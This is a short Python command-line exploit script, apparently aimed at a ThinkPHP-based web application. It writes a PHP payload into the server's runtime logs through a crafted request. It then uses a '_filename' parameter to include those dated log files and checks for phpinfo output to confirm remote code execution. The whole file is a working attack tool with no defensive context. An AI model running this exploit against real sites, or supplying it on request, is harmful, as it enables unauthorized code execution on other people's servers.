import optparse
import requests
import urllib3
import time

class Exploit(object):
    def __init__(self,url,path=""):
        self.headers={"User-Agent":"Raiden_Mei"}
        check="<title>phpinfo()</title>"
        logcreate_payload="/index.php?m=--><?=phpinfo();?>"
        request_payload="/index.php?m=Home&c=Index&a=index&value[_filename]="
        if (path==""):
            self.path=["./Application/Runtime/Logs/Common/{times}.log","./Application/Runtime/Logs/Home/{times}.log"]
        else:
            self.path=""
        createlog=urllib3.PoolManager()
        createlog.request("GET",str(url).rstrip("/")+logcreate_payload)
        for p in self.path:
            rqt=requests.get(url=str(url).rstrip("/")+request_payload+p.format(times=time.strftime("%Y_%m_%d")[2:]),headers=self.headers)
            if check in rqt.text:
                print("[+] {} RCE Sucess".format(url))


if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option('-u',dest="url",help="url")
    parser.add_option('-d',dest="default",action="store_true",help="默认路径测试")
    (option,args)=parser.parse_args()
    if(option.url and option.default):
        url=option.url
        obj=Exploit(url)
    else:
        parser.print_help()